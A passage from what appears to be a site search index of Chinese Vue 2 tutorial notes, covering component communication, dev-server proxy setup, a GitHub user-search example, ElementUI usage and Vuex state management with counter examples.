注意\",\"slug\":\"_2-3-注意\",\"contents\":[\"此方式用于父组件向子组件传递数据\",\"所有标签属性都会成为组件对象的属性, 模板页面可以直接引用\",\"问题： \",\"如果需要向非子后代传递数据必须多层逐层传递\",\"兄弟组件间也不能直接 props 通信, 必须借助父组件才可以\"]},{\"header\":\"3. 自定义事件\",\"slug\":\"_3-自定义事件\",\"contents\":[\"一种组件间通信的方式，适用于：子组件 ===> 父组件\",\"存在的问题：隔代组件或兄弟组件间通信此种方式不合适\",\"使用场景：子组件想给父组件传数据，那么就要在父组件中给子组件绑定自定义事件（A 是父组件，B 是子组件，B 想给 A 传数据，那么就要在 A 中给 B 绑定自定义事件，事件的回调在 A 中）\",\"绑定自定义事件：\",\"第一种方式，在父组件中 <Demo @事件名=\\\"方法\\\"/> 或 <Demo v-on: 事件名=\\\"方法\\\"/>\",\"第二种方式，在父组件中 this.$refs.demo.$on('事件名',方法)\",\"<Demo ref=\\\"demo\\\"/> ...... mounted(){ this.$refs.demo.$on('事件名',方法) } \",\"若想让自定义事件只能触发一次，可以使用 once 修饰符，或 $once 方法\",\"触发自定义事件：this.$emit('事件名', 数据)\",\"解绑自定义事件：this.$off('事件名')\",\"组件上也可以绑定原生 DOM 事件，需要使用 native 修饰符，如： @click.native=\\\"show\\\"，上面绑定自定义事件，即使绑定的是原生事件也会被认为是自定义的，需要加 native，加了后就将此事件给组件的根元素\",\"注意：通过 this.$refs.xxx.$on('事件名',回调函数) 绑定自定义事件时，回调函数要么配置在 methods 中，要么用箭头函数，否则 this 指向会出问题\",\"例：\",\"src/App.vue\",\"<template> <div> <h1>{{ msg }}学生的姓名是：{{ studentName }}</h1> <Student @getName=\\\"getStudentName\\\"></Student> </div> </template> <script> import Student from './components/Student.vue' export default { name: 'App', components: { Student }, data() { return { msg: '你好啊！', studentName: '', } }, methods: { getStudentName(name) { this.studentName = name } } } </script> \",\"src/components/Student.vue\",\"<template> <div> <h2>学生姓名：{{ name }}</h2> <h2>学生性别：{{ sex }}</h2> <button @click=\\\"sendStudentName\\\">把学生姓名给App</button> </div> </template> <script> export default { name: 'Student', data() { return { name: '张三', sex: '男', number: 0, } }, methods: { sendStudentName() { this.$emit('getName', this.name) } } } </script> \",\"效果：\",\"Vue核心-组件间通信01.gif\"]},{\"header\":\"4. 全局事件总线\",\"slug\":\"_4-全局事件总线\",\"contents\":[\"一种可以在任意组件间通信的方式，本质上就是一个对象，它必须满足以下条件\",\"所有的组件对象都必须能看见它\",\"这个对象必须能够使用 $on、$emit、$off 方法去绑定、触发和解绑事件\",\"使用步骤：\",\"安装全局事件总线\",\"new Vue({ ... beforeCreate() { Vue.prototype.$bus = this // 安装全局事件总线，$bus 就是当前应用的 vm }, ... }) \",\"使用事件总线\",\"接收数据：A 组件想接收数据，则在 A 组件中给 $bus 绑定自定义事件，事件的回调留在 A 组件自身\",\"export default { methods(){ demo(data){...} } ... mounted() { this.$bus.$on('xxx',this.demo) } } \",\"提供数据：this.$bus.$emit('xxx',数据)\",\"最好在 beforeDestroy 钩子中，用 $off() 去解绑当前组件所用到的事件\",\"例：\",\"src/main.js\",\"import Vue from 'vue' import App from './App.vue' Vue.config.productionTip = false new Vue({ el:'#app', render: h => h(App), beforeCreate() { Vue.prototype.$bus = this // 安装全局事件总线 } }) \",\"src/App.vue\",\"<template> <div class=\\\"app\\\"> <School></School> <Student></Student> </div> </template> <script> import School from './components/School.vue' import Student from './components/Student.vue' export default { name: 'App', components: { School, Student } } </script> <style scoped> .app { background-color: gray; padding: 5px; } </style> \",\"src/components/School.vue\",\"<template> <div class=\\\"school\\\"> <h2>学校名称：{{ name }}</h2> <h2>学校地址：{{ address }}</h2> <h2>学生姓名：{{ studentName }}</h2> </div> </template> <script> export default { name: 'School', data() { return { name: 'QFNU', address: '曲阜', studentName: '', } }, mounted() { this.$bus.$on('getData', (data) => { console.log('我是School组件,收到了数据', data) this.studentName = data }) }, beforeDestroy() { this.$bus.$off('getData') }, } </script> <style scoped> .school { background-color: skyblue; padding: 5px; } </style> \",\"src/components/Student.vue\",\"<template> <div class=\\\"student\\\"> <h2>学生姓名：{{ name }}</h2> <h2>学生性别：{{ sex }}</h2> <button @click=\\\"sendStudentName\\\">把学生姓名给School组件</button> </div> </template> <script> export default { name: \\\"Student\\\", data() { return { name: '张三', sex: '男', number: 0, } }, methods: { sendStudentName() { this.$bus.$emit('getData', this.name) } } } </script> \",\"效果：\",\"Vue核心-组件间通信02.gif\"]},{\"header\":\"5. 消息订阅与发布(基本不用)\",\"slug\":\"_5-消息订阅与发布-基本不用\",\"contents\":[\"消息订阅与发布（pubsub），消息订阅与发布是一种组件间通信的方式，适用于任意组件间通信\",\"使用步骤:\",\"安装 pubsub：npm i pubsub-js\",\"引入：import pubsub from 'pubsub-js'\",\"接收数据：A 组件想接收数据，则在 A 组件中订阅消息，订阅的回调留在 A 组件自身\",\"export default { methods: { demo(msgName, data) {...} } ... mounted() { this.pid = pubsub.subscribe('xxx',this.demo) } } \",\"提供数据：pubsub.publish('xxx',data)\",\"最好在 beforeDestroy 钩子中，使用 pubsub.unsubscribe(pid) 取消订阅\",\"例：\",\"src/App.vue\",\"<template> <div class=\\\"app\\\"> <School></School> <Student></Student> </div> </template> <script> import School from './components/School.vue' import Student from './components/Student.vue' export default { name: 'App', components: { School, Student } } </script> <style scoped> .app { background-color: gray; padding: 5px; } </style> \",\"src/components/School.vue\",\" \",\"src/components/Student.vue\",\" \",\"效果：\",\"Vue核心-组件间通信03.gif\"]},{\"header\":\"6. slot\",\"slug\":\"_6-slot\",\"contents\":[]},{\"header\":\"6.1 理解\",\"slug\":\"_6-1-理解\",\"contents\":[\"此方式用于父组件向子组件传递 标签数据\"]},{\"header\":\"6.2 子组件\",\"slug\":\"_6-2-子组件\",\"contents\":[\"<template> <div> <slot name=\\\"xxx\\\">不确定的标签结构1</slot> <div>组件确定的标签结构</div> <slot name=\\\"yyy\\\">不确定的标签结构2</slot> </div> </template> \"]},{\"header\":\"6.3 父组件\",\"slug\":\"_6-3-父组件\",\"contents\":[\"<child> <div slot=\\\"xxx\\\">xxx 对应的标签结构</div> <div slot=\\\"yyy\\\">yyyy 对应的标签结构</div> </child> \"]}]},\"/front-end/vue-notes/20-Vue%E6%A0%B8%E5%BF%83-%E5%8F%91%E9%80%81Ajax%E8%AF%B7%E6%B1%82.html\":{\"title\":\"发送Ajax请求\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/20-Vue核心-发送Ajax请求\"]},{\"header\":\"1. Vue脚手架配置代理\",\"slug\":\"_1-vue脚手架配置代理\",\"contents\":[\"目的：解决开发环境 Ajax 跨域问题\",\"注意：vue.config.js 是一个可选的配置文件，如果项目的 (和 package.json 同级的) 根目录中存在这个文件，那么它会被 @vue/cli-service 自动加载。你也可以使用 package.json 中的 Vue 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写\"]},{\"header\":\"1.1 方法一\",\"slug\":\"_1-1-方法一\",\"contents\":[\"在 vue.config.js 中添加如下配置：\",\" devServer:{ proxy:\\\"http://localhost:5000\\\" } \",\"说明：\",\"优点：配置简单，请求资源时直接发给前端（8080）即可\",\"缺点：不能配置多个代理，不能灵活的控制请求是否走代理\",\"工作方式：若按照上述配置代理，当请求了前端不存在的资源时，该请求会转发给服务器 （优先匹配前端资源）\"]},{\"header\":\"1.2 方法二\",\"slug\":\"_1-2-方法二\",\"contents\":[\"编写 vue.config.js 配置具体代理规则：\",\"module.exports = { devServer: { proxy: { '/api1': { // 匹配所有以 '/api1'开头的请求路径 target: 'http://localhost:5000', // 代理目标的基础路径 pathRewrite: {'^/api1':''}, // 代理往后端服务器的请求去掉 /api1 前缀 ws: true, // WebSocket changeOrigin: true, }, '/api2': { target: 'http://localhost:5001', pathRewrite: {'^/api2': ''}, changeOrigin: true } } } } /* changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000 changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080 changeOrigin默认值为true */ \",\"说明：\",\"优点：可以配置多个代理，且可以灵活的控制请求是否走代理\",\"缺点：配置略微繁琐，请求资源时必须加前缀\"]},{\"header\":\"1.3 示例\",\"slug\":\"_1-3-示例\",\"contents\":[\"vue.config.js\",\"module.exports = { pages: { index: { entry: 'src/main.js', }, }, lintOnSave:false, // 开启代理服务器（方式一） // devServer: { // proxy:'http://localhost:5000' // } //开启代理服务器（方式二） devServer: { proxy: { '/api1': { target: 'http://localhost:5000', pathRewrite:{'^/api1':''}, // ws: true, //用于支持websocket,默认值为true // changeOrigin: true //用于控制请求头中的host值,默认值为true }, '/api2': { target: 'http://localhost:5001', pathRewrite:{'^/api2':''}, } } } } \"]},{\"header\":\"2. GitHub用户搜索案例\",\"slug\":\"_2-github用户搜索案例\",\"contents\":[\"接口地址：https://api.github.com/search/users?q=xxx\",\"src/main.js\",\"import Vue from 'vue' import App from './App.vue' Vue.config.productionTip = false new Vue({ el:\\\"#app\\\", render: h => h(App), beforeCreate(){ Vue.prototype.$bus = this } }) \",\"src/App.vue\",\"<template> <div> <MySearch></MySearch> <MyList></MyList> </div> </template> <script> import MyList from './components/MyList' import MySearch from './components/MySearch' export default { name: 'App', components: { MyList, MySearch } } </script> \",\"src/components/MySearch.vue\",\"<template> <div> <h1>Search Github Users</h1> <input type=\\\"text\\\" placeholder=\\\"enter the name you search\\\" v-model=\\\"searchName\\\"> <button @click=\\\"search\\\">Search</button> </div> </template> <script> export default { name: 'MySearch', data() { return { searchName: \\\"\\\", } }, methods: { search() { const searchName = this.searchName.trim() if (searchName) { this.$bus.$emit('updateList', searchName) } } } } </script> \",\"src/components/MyList.vue\",\"<template> <div> <h2 v-if=\\\"loading\\\">Loading...</h2> <h2 v-if=\\\"errorMsg\\\">{{ errorMsg }}</h2> <div v-for=\\\"(user, index) in users\\\" :key=\\\"index\\\"> <a :href=\\\"user.url\\\"> <img :src=\\\"user.avatar_url\\\" style=\\\"width: 100px\\\" /> </a> <p class=\\\"card-text\\\">{{ user.name }}</p> </div> </div> </template> <script> import axios from \\\"axios\\\" export default { name: 'MyList', data() { return { firstView: true, loading: false, users: null, errorMsg: '' } }, mounted() { this.$bus.$on(\\\"updateList\\\", (searchName) => { this.firstView = false this.loading = true this.users = null this.errorMsg = \\\"\\\" axios.get(`https://api.github.com/search/users?q=${searchName}`).then((response) => { console.log('请求成功') const result = response.data const users = result.items.map((item) => ({ url: item.html_url, avatar_url: item.avatar_url, name: item.login })) this.loading = false this.users = users }) .catch((error) => { this.loading = false this.errorMsg = \\\"请求失败\\\" console.log('请求失败') console.log(error) }) }) } } </script> \"]},{\"header\":\"3. Vue项目常用的两个Ajax库\",\"slug\":\"_3-vue项目常用的两个ajax库\",\"contents\":[\"vue 项目常用的两个 Ajax 库:\",\"axios：通用的 Ajax 请求库，官方推荐，效率高，安装 npm install axios\",\"vue-resource：vue 插件库，vue1.x使用广泛，官方已不维护\",\"下载 vue-resource 库 npm i vue-resource\",\"src/main.js\",\"import Vue from 'vue' import App from './App.vue' import vueResource from 'vue-resource' Vue.config.productionTip = false Vue.use(vueResource) new Vue({ el:\\\"#app\\\", render: h => h(App), beforeCreate(){ Vue.prototype.$bus = this } }) \",\"src/App.vue\",\"<template> <div class=\\\"container\\\"> <Search/> <List/> </div> </template> <script> import Search from './components/Search.vue' import List from './components/List.vue' export default { name:'App', components:{ Search, List }, } </script> \",\"src/components/Search.vue\",\"<template> <section class=\\\"jumbotron\\\"> <h3 class=\\\"jumbotron-heading\\\">Search Github Users</h3> <div> <input type=\\\"text\\\" placeholder=\\\"enter the name you search\\\" v-model=\\\"keyWord\\\"/>&nbsp; <button @click=\\\"getUsers\\\">Search</button> </div> </section> </template> <script> export default { name:'Search', data() { return { keyWord:'' } }, methods: { getUsers(){ //请求前更新List的数据 this.$bus.$emit('updateListData', {isLoading:true,errMsg:'',users:[],isFirst:false}) this.$http.get(`https://api.github.com/search/users?q=${this.keyWord}`).then( response => { console.log('请求成功了') //请求成功后更新List的数据 this.$bus.$emit('updateListData', {isLoading:false,errMsg:'',users:response.data.items}) }, error => { //请求后更新List的数据 this.$bus.$emit('updateListData', {isLoading:false,errMsg:error.message,users:[]}) } ) } } } </script> \",\"src/components/List.vue\",\"<template> <div class=\\\"row\\\"> <!-- 展示用户列表 --> <div class=\\\"card\\\" v-show=\\\"info.users.length\\\" v-for=\\\"user in info.users\\\" :key=\\\"user.id\\\"> <a :href=\\\"user.html_url\\\" target=\\\"_blank\\\"> <img :src=\\\"user.avatar_url\\\" style='width: 100px'/> </a> <h4 class=\\\"card-title\\\">{{user.login}}</h4> </div> <!-- 展示欢迎词 --> <h1 v-show=\\\"info.isFirst\\\">欢迎使用！</h1> <!-- 展示加载中 --> <h1 v-show=\\\"info.isLoading\\\">加载中...</h1> <!-- 展示错误信息 --> <h1 v-show=\\\"info.errMsg\\\">{{errMsg}}</h1> </div> </template> <script> export default { name:'List', data() { return { info:{ isFirst:true, isLoading:false, errMsg:'', users:[] } } }, mounted(){ this.$bus.$on('updateListData',(dataObj)=>{ this.info = {...this.info,...dataObj} }) }, beforeDestroy(){ this.$bus.$off('updateListData') } } </script> \"]}]},\"/front-end/vue-notes/21-VueUI%E7%BB%84%E4%BB%B6%E5%BA%93.html\":{\"title\":\"VueUI组件库\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：无\"]},{\"header\":\"1. 常用UI组件库\",\"slug\":\"_1-常用ui组件库\",\"contents\":[]},{\"header\":\"1.1 移动端常用UI组件库\",\"slug\":\"_1-1-移动端常用ui组件库\",\"contents\":[\"Vant\",\"Cube UI\",\"Mint UI\",\"NutUI\"]},{\"header\":\"1.2 PC端常用UI组件库\",\"slug\":\"_1-2-pc端常用ui组件库\",\"contents\":[\"Element UI\",\"IView UI\"]},{\"header\":\"2. ElementUI基本使用\",\"slug\":\"_2-elementui基本使用\",\"contents\":[\"安装 element-ui：npm i element-ui\",\"src/main.js\",\"import Vue from 'vue' import App from './App.vue' import ElementUI from 'element-ui' // 引入ElementUI组件库 import 'element-ui/lib/theme-chalk/index.css' // 引入ElementUI全部样式 Vue.config.productionTip = false Vue.use(ElementUI) // 使用ElementUI new Vue({ el:\\\"#app\\\", render: h => h(App), }) \",\"src/App.vue\",\"<template> <div> <br> <el-row> <el-button icon=\\\"el-icon-search\\\" circle></el-button> <el-button type=\\\"primary\\\" icon=\\\"el-icon-edit\\\" circle></el-button> <el-button type=\\\"success\\\" icon=\\\"el-icon-check\\\" circle></el-button> <el-button type=\\\"info\\\" icon=\\\"el-icon-message\\\" circle></el-button> <el-button type=\\\"warning\\\" icon=\\\"el-icon-star-off\\\" circle></el-button> <el-button type=\\\"danger\\\" icon=\\\"el-icon-delete\\\" circle></el-button> </el-row> </div> </template> <script> export default { name:'App', } </script> \"]},{\"header\":\"3. ElementUI按需引入\",\"slug\":\"_3-elementui按需引入\",\"contents\":[\"安装 babel-plugin-component：npm i babel-plugin-component -D\",\"修改babel-config-js\",\"module.exports = { presets: [ '@vue/cli-plugin-babel/preset', [\\\"@babel/preset-env\\\", { \\\"modules\\\": false }] ], plugins: [ [ \\\"component\\\", { \\\"libraryName\\\": \\\"element-ui\\\", \\\"styleLibraryName\\\": \\\"theme-chalk\\\" } ] ] } \",\"src/main.js\",\"import Vue from 'vue' import App from './App.vue' import { Button,Row } from 'element-ui' // 按需引入 Vue.config.productionTip = false Vue.component(Button.name, Button); Vue.component(Row.name, Row); /* 或写为 * Vue.use(Button) * Vue.use(Row) */ new Vue({ el:\\\"#app\\\", render: h => h(App), }) \"]}]},\"/front-end/vue-notes/22-Vuex.html\":{\"title\":\"Vuex\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/22-Vuex\"]},{\"header\":\"1. 理解Vuex\",\"slug\":\"_1-理解vuex\",\"contents\":[]},{\"header\":\"1.1 Vuex是什么\",\"slug\":\"_1-1-vuex是什么\",\"contents\":[\"概念：专门在 Vue 中实现集中式状态（数据）管理的一个 Vue 插件，对 Vue 应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信\",\"Vuex01.png\",\"Vuex02.png\"]},{\"header\":\"1.2 什么时候使用Vuex\",\"slug\":\"_1-2-什么时候使用vuex\",\"contents\":[\"多个组件依赖于同一状态\",\"来自不同组件的行为需要变更同一状态\",\"以前的解决办法：\",\"将数据以及操作数据的行为都定义在父组件\",\"将数据以及操作数据的行为传递给需要的各个子组件 (有可能需要多级传递)\"]},{\"header\":\"1.3 Vuex工作原理\",\"slug\":\"_1-3-vuex工作原理\",\"contents\":[\"Vuex03.png\",\"Vuex 由三个部分构成，Actions (动作)，Mutations (修改，加工维护)，State (状态，即数据)，将数据交给 Vuex 中的 state 对象进行保管，通过 store 来管理 Vuex 的三个部分，当组件需要修改状态时，通过调用 mutations 中的方法来提交 mutation。Mutation 是同步的操作，它会更新状态的值。在某些情况下，组件可能需要进行异步操作，例如从服务器获取数据。在这种情况下，可以调用 actions 中的方法来触发异步操作。Action 会执行异步任务，并在任务完成后提交对应的 mutation。\",\"理解：State 相当于菜，VueComponents 相当于客人，Actions 相当于服务员，Mutations 相当于后厨\"]},{\"header\":\"1.4 Vuex相关概念\",\"slug\":\"_1-4-vuex相关概念\",\"contents\":[]},{\"header\":\"1.4.1 state\",\"slug\":\"_1-4-1-state\",\"contents\":[\"Vuex 管理的状态对象\",\"它应该是唯一的\",\"const state = {sum:0}; \"]},{\"header\":\"1.4.2 mutations\",\"slug\":\"_1-4-2-mutations\",\"contents\":[\"包含多个直接更新 state 的方法 (回调函数)的对象\",\"谁来触发: action 中的 commit ('mutation 名称')\",\"只能包含同步的代码, 不能写异步代码\",\"const mutations = { ADD (state, value) { // 更新state 的某个属性 state.sum += value; }; }; \"]},{\"header\":\"1.4.3 actions\",\"slug\":\"_1-4-3-actions\",\"contents\":[\"包含多个事件回调函数的对象\",\"通过执行: commit() 来触发 mutation 的调用, 间接更新 state\",\"谁来触发: 组件中: $store.dispatch ('action 名称', value) \",\"可以包含异步代码 (定时器, Ajax)\",\"const actions = { add (context, value) { context.commit('ADD', value) }; }; \"]},{\"header\":\"1.4.4 getters\",\"slug\":\"_1-4-4-getters\",\"contents\":[\"包含多个计算属性 (get) 的对象\",\"谁来读取: 组件中: $store.getters.xxx\",\"const getters = { bigNum(state) { return state.sum * 10; }; }; \"]},{\"header\":\"1.4.5 modules\",\"slug\":\"_1-4-5-modules\",\"contents\":[\"包含多个 module\",\"一个 module 是一个 store 的配置对象\",\"与一个组件 (包含有共享数据)对应\"]},{\"header\":\"1.4.6 向外暴露store对象代码\",\"slug\":\"_1-4-6-向外暴露store对象代码\",\"contents\":[\"export default new Vuex.Store({ state, mutations, actions, getters }); \"]},{\"header\":\"1.4.7 引入store\",\"slug\":\"_1-4-7-引入store\",\"contents\":[\"import store from './store'; new Vue({ store }); \"]},{\"header\":\"1.4.8 store对象\",\"slug\":\"_1-4-8-store对象\",\"contents\":[\"所有用 Vuex 管理的组件中都多了一个属性 $store, 它就是一个 store 对象\",\"属性:\",\"state: 注册的 state 对象\",\"getters: 注册的 getters 对象\",\"方法：\",\"dispatch(actionsName, value)，分发调用 action\",\"commit(mutationsName, value)，分发调用 mutations\"]},{\"header\":\"2. Vuex环境搭建\",\"slug\":\"_2-vuex环境搭建\",\"contents\":[\"下载安装 Vuex\",\"npm i vuex // Vue2版本 npm i vuex@3 \",\"创建store对象并导出挂载\",\"创建 src/store/index.js 文件，该文件用于创建 Vuex 中最为核心的 store\",\"import Vue from 'vue'; //引入Vue核心库 import Vuex from 'vuex'; // 引入Vuex Vue.use(Vuex); // 应用Vuex插件 const actions = {}; // 准备actions对象——用于响应组件中的动作（获取后端API数据或者进行业务逻辑处理） const mutations = {}; // 准备mutations对象——用于操作数据（即修改state中的数据） const state = {}; // 准备state对象——用于存储数据 // 创建并暴露store export default new Vuex.Store({ actions, mutations, state, }); \",\"在src/main.js 中引入store对象\",\"...... import store from './store/index'; // 引入store ...... new Vue({ el: '#app', render: h => h(App), store, // 引入store }); \"]},{\"header\":\"3. Vuex的基本使用\",\"slug\":\"_3-vuex的基本使用\",\"contents\":[\"初始化数据 state，配置 actions、mutations，操作文件 store.js\",\"组件中读取 Vuex 中的数据 $store.state.数据\",\"组件中修改 vuex 中的数据 $store.dispatch('action中的方法名',数据)或$store.commit('mutations中的方法名', 数据) \",\"注意：若没有网络请求或其他业务逻辑，组件中也可越过 actions，即不写 dispatch，直接编写 commit\"]},{\"header\":\"4. 求和案例\",\"slug\":\"_4-求和案例\",\"contents\":[\"效果：\",\"Vuex04.gif\"]},{\"header\":\"4.1 纯Vue版本\",\"slug\":\"_4-1-纯vue版本\",\"contents\":[\"src/App.vue\",\"<template> <div> <Count></Count> </div> </template> <script> import Count from './components/Count' export default { name: 'App', components: { Count } } </script> \",\"src/components/Count.vue\",\"<template> <div> <h2>当前求和为：{{ sum }}</h2> <select v-model.number=\\\"n\\\"> <!-- 这里的.number是指令修饰符，将输入的数据转换为数字 --> <option value=\\\"1\\\">1</option> <option value=\\\"2\\\">2</option> <option value=\\\"3\\\">3</option> </select> <button @click=\\\"increment\\\">+</button> <button @click=\\\"decrement\\\">-</button> <button @click=\\\"incrementOdd\\\">当前求和为奇数时再加</button> <button @click=\\\"incrementWait\\\">等一等再加</button> </div> </template> <script> export default { name: 'Count', data() { return { sum: 0,//当前的和 n: 1,//用户选择的数字 } }, methods: { increment() { this.sum += this.n }, decrement() { this.sum -= this.n }, incrementOdd() { if (this.sum % 2) { this.sum += this.n } }, incrementWait() { setTimeout(() => { this.sum += this.n }, 500) }, }, } </script> \"]},{\"header\":\"4.2 Vuex版本\",\"slug\":\"_4-2-vuex版本\",\"contents\":[\"src/store/index.js 该文件用于创建 Vuex 中最为核心的 store\",\"import Vue from 'vue' //引入Vue核心库 import Vuex from 'vuex' // 引入Vuex Vue.use(Vuex) // 应用Vuex插件 // 准备actions对象——用于响应组件中的动作 // 包含多个方法: 触发mutation调用, 间接更新state // 一个方法就是一个action // action中可以有逻辑代码和异步代码 // action由组件来触发调用: this.$store.dispatch('actionName') const actions = { //第二步 jia(context, value) { context.commit('JIA', value) //开发中一般大写 }, jian(context, value) { context.commit('JIAN', value) }, jiaOdd(context, value) { if (context.state.sum % 2) { context.commit('JIA', value) } }, jiaWait(context, value) { setTimeout(() => { context.commit('JIA', value) }, 500) }, } // 准备mutations对象——用于操作数据（即修改state中的数据） // 包含多个方法: 能直接更新state // 一个方法就是一个mutation // mutation只能包含更新state的同步代码, 也不会有逻辑 // mutation由action触发调用: commit('mutationName') const mutations = { //第三步 JIA(state, value) { state.sum += value }, JIAN(state, value) { state.sum -= value }, } // 准备state对象——用于存储数据 //state 对象 //类似于data const state = { sum: 0, } // 创建并暴露store export default new Vuex.Store({ actions, mutations, state, }) \",\"src/components/Count.vue\",\"<template> <div> <h2>当前求和为：{{ $store.state.sum }}</h2> <select v-model.number=\\\"n\\\"> <!-- 这里的.number是指令修饰符，将输入的数据转换为数字 --> <option value=\\\"1\\\">1</option> <option value=\\\"2\\\">2</option> <option value=\\\"3\\\">3</option> </select> <button @click=\\\"increment\\\">+</button> <button @click=\\\"decrement\\\">-</button> <button @click=\\\"incrementOdd\\\">当前求和为奇数时再加</button> <button @click=\\\"incrementWait\\\">等一等再加</button> </div> </template> <script> export default { name: 'Count', data() { return { n: 1,//用户选择的数字 } }, methods: { increment() { //第一步 this.$store.dispatch('jia', this.n) }, decrement() { this.$store.dispatch('jian', this.n) }, incrementOdd() { this.$store.dispatch('jiaOdd', this.n) }, incrementWait() { this.$store.dispatch('jiaWait', this.n) }, }, } </script> \",\"main.js\",\"import Vue from 'vue' import App from './App.vue' import store from './store' // 引入store Vue.config.productionTip = false new Vue({ el: '#app', render: (h) => h(App), store, }) \",\"App.vue\",\"<template> <div> <Count></Count> </div> </template> <script> import Count from './components/Count' export default { name: 'App', components: { Count } } </script> \"]},{\"header\":\"5. getters配置项\",\"slug\":\"_5-getters配置项\",\"contents\":[\"概念：当 state 中的数据需要经过加工后再使用时，可以使用 getters 加工，相当于全局计算属性\",\"在 store.js 中追加 getters 配置：\",\"...... const getters = { bigSum(state){ return state.sum * 10 } } // 创建并暴露store export default new Vuex.Store({ ...... getters }) \",\"组件中读取数据 $store.getters.bigSum\",\"例： 求和案例可以添加一个计算求和放大十倍的功能 src/store/index.js\",\"import Vue from 'vue' //引入Vue核心库 import Vuex from 'vuex' // 引入Vuex Vue.use(Vuex) // 应用Vuex插件 // 准备actions对象——用于响应组件中的动作 // 包含多个方法: 触发mutation调用, 间接更新state // 一个方法就是一个action // action中可以有逻辑代码和异步代码 // action由组件来触发调用: this.$store.dispatch('actionName') const actions = { jia(context, value) { context.commit('JIA', value) //开发中一般大写 }, jian(context, value) { context.commit('JIAN', value) }, jiaOdd(context, value) { if (context.state.sum % 2) { context.commit('JIA', value) } }, jiaWait(context, value) { setTimeout(() => { context.commit('JIA', value) }, 500) }, } // 准备mutations对象——用于操作数据（即修改state中的数据） // 包含多个方法: 能直接更新state // 一个方法就是一个mutation // mutation只能包含更新state的同步代码, 也不会有逻辑 // mutation由action触发调用: commit('mutationName') const mutations = { JIA(state, value) { state.sum += value }, JIAN(state, value) { state.sum -= value }, } // 准备state对象——用于存储数据 //state 对象 //类似于data const state = { sum: 0, } // 准备getters——用于将state中的数据进行加工 const getters = { bigSum(state) { return state.sum * 10 }, } // 创建并暴露store export default new Vuex.Store({ actions, mutations, state, getters }) \",\"src/components/Count.vue\",\"<template> <div> <h2>当前求和为：{{ $store.state.sum }}</h2> <h3>当前求和放大10倍为:{{ $store.getters.bigSum }}</h3> <select v-model.number=\\\"n\\\"> <!-- 这里的.number是指令修饰符，将输入的数据转换为数字 --> <option value=\\\"1\\\">1</option> <option value=\\\"2\\\">2</option> <option value=\\\"3\\\">3</option> </select> <button @click=\\\"increment\\\">+</button> <button @click=\\\"decrement\\\">-</button> <button @click=\\\"incrementOdd\\\">当前求和为奇数时再加</button> <button @click=\\\"incrementWait\\\">等一等再加</button> </div> </template> <script> export default { name: 'Count', data() { return { n: 1,//用户选择的数字 } }, methods: { increment() { this.$store.dispatch('jia', this.n) }, decrement() { this.$store.dispatch('jian', this.n) }, incrementOdd() { this.$store.dispatch('jiaOdd', this.n) }, incrementWait() { this.$store.dispatch('jiaWait', this.n) }, }, } </script> \",\"效果：\",\"Vuex05.png\"]},{\"header\":\"6. 常用map映射对象\",\"slug\":\"_6-常用map映射对象\",\"contents\":[\"map映射对象在使用时应该先引入\",\"import {map映射对象} from 'vuex'; \"]},{\"header\":\"6.1 mapState与mapGetters\",\"slug\":\"_6-1-mapstate与mapgetters\",\"contents\":[\"mapState用于将 Vuex store 的状态映射到组件的计算属性中，可以简化在组件中访问 Vuex store 状态的代码：\",\"computed: { // 借助mapState生成计算属性：sum、mySchool、subject（写法一：对象写法） ...mapState({sum:'sum',mySchool:'school',subject:'subject'}), // 借助mapState生成计算属性：sum、school、subject（写法二：数组写法） ...mapState(['sum','school','subject']), }, \",\"mapGetters用于将 Vuex store 的 getters 映射到组件的计算属性中，可以简化在组件中访问 Vuex store getters 的代码：\",\"computed: { //借助mapGetters生成计算属性：bigSum（写法一：对象写法） ...mapGetters({bigSum:'bigSum'}), //借助mapGetters生成计算属性：bigSum（写法二：数组写法） ...mapGetters(['bigSum']) }, \"]},{\"header\":\"6.2 mapState与mapGetters代码演示\",\"slug\":\"_6-2-mapstate与mapgetters代码演示\",\"contents\":[\"在求和案例中，我们再添加一行 我在QFNU学习前端，模板里要写 $store.state.sum、$store.getters.bigSum 等，会很麻烦，使用 map 方法我们在模板中只需要写 sum、bigSum 等，更加方便\",\"src/store/index.js\",\"import Vue from 'vue' //引入Vue核心库 import Vuex from 'vuex' // 引入Vuex Vue.use(Vuex) // 应用Vuex插件 // 准备actions对象——用于响应组件中的动作 // 包含多个方法: 触发mutation调用, 间接更新state // 一个方法就是一个action // action中可以有逻辑代码和异步代码 // action由组件来触发调用: this.$store.dispatch('actionName') const actions = { jia(context, value) { context.commit('JIA', value) //开发中一般大写 }, jian(context, value) { context.commit('JIAN', value) }, jiaOdd(context, value) { if (context.state.sum % 2) { context.commit('JIA', value) } }, jiaWait(context, value) { setTimeout(() => { context.commit('JIA', value) }, 500) }, } // 准备mutations对象——用于操作数据（即修改state中的数据） // 包含多个方法: 能直接更新state // 一个方法就是一个mutation // mutation只能包含更新state的同步代码, 也不会有逻辑 // mutation由action触发调用: commit('mutationName') const mutations = { JIA(state, value) { state.sum += value }, JIAN(state, value) { state.sum -= value }, } // 准备state对象——用于存储数据 //state 对象 //类似于data const state = { sum: 0, school: 'QFNU', subject: '前端', } // 准备getters——用于将state中的数据进行加工 const getters = { bigSum(state) { return state.sum * 10 }, } // 创建并暴露store export default new Vuex.Store({ actions, mutations, state, getters, }) \",\"src/components/Count.vue\",\"<template> <div> <h2>当前求和为：{{ sum }}</h2> <h3>当前求和放大10倍为:{{ bigSum }}</h3> <h3>我在{{ school }}，学习{{ subject }}</h3> <select v-model.number=\\\"n\\\"> <!-- 这里的.number是指令修饰符，将输入的数据转换为数字 --> <option value=\\\"1\\\">1</option> <option value=\\\"2\\\">2</option> <option value=\\\"3\\\">3</option> </select> <button @click=\\\"increment\\\">+</button> <button @click=\\\"decrement\\\">-</button> <button @click=\\\"incrementOdd\\\">当前求和为奇数时再加</button> <button @click=\\\"incrementWait\\\">等一等再加</button> </div> </template> <script> import { mapState, mapGetters } from 'vuex' export default { name: 'Count', data() { return { n: 1,//用户选择的数字 } }, methods: { increment() { this.$store.dispatch('jia', this.n) }, decrement() { 